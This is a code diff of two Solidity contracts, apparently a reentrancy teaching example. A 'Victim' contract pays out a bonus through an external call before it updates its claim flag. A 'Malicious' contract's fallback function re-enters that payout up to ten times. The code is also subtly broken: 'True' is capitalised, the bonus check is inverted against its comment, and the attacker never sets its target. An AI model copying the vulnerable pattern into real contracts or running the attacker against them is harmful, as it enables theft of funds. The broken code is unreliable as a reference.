@@ -5,15 +5,11 @@ contract Victim{
   mapping (address => bool) private claimedBonus;
   mapping (address => uint) private rewardsForA;
 
-  function InitialUser() payable{ 
-     claimedBonus[msg.sender]=true;      
-  } 
-
-  function AddToBalance() payable{ 
+  function Deposit() payable{ 
      userBalances[msg.sender] += msg.value; 
   } 
 
-  function WithdrawReward(address recipient) public {
+  function WithdrawReward(address recipient) external {
       uint amountToWithdraw = rewardsForA[recipient];
       rewardsForA[recipient] = 0;
       if (recipient.call.value(amountToWithdraw)() == false) {
@@ -21,14 +17,13 @@ contract Victim{
       }
   }
 
-  function GetFirstWithdrawBonus(address recipient) public {
-      if (claimedBonus[recipient] == false) {
+  function GetFirstWithdrawBonus(address recipient) external {
+      if (claimedBonus[recipient] == false) {  // Each recipient should only be able to claim the bonus once
            throw;
       }
       rewardsForA[recipient] += 100;
-      WithdrawReward(recipient); 
-      //claimedBonus has been set to false, so reentry is impossible
-      claimedBonus[recipient] = false;
+      WithdrawReward(recipient);  // At this point, the caller will be able to execute getFirstWithdrawalBonus again.
+      claimedBonus[recipient] = True;
    }
 }
 
@@ -41,19 +36,19 @@ contract Malicious{
   Victim vul;
   uint public count = 0;
 
- //initial the attack contract with the vulnerable address
+ //initial attack contract with the vulnerable address
  function Malicious(){ 
-  _owner=msg.sender;
+    _owner=msg.sender;
  }
  
  function attack(){
-  vul.GetFirstWithdrawBonus(_owner);
+    vul.GetFirstWithdrawBonus(_owner);
  }
  
  function () payable{
-  count++;
-  if(count < 10){
-    vul.GetFirstWithdrawBonus(_owner);
-  }
+    count++;
+    if(count < 10){
+      vul.GetFirstWithdrawBonus(_owner);
+    }
  }
 }
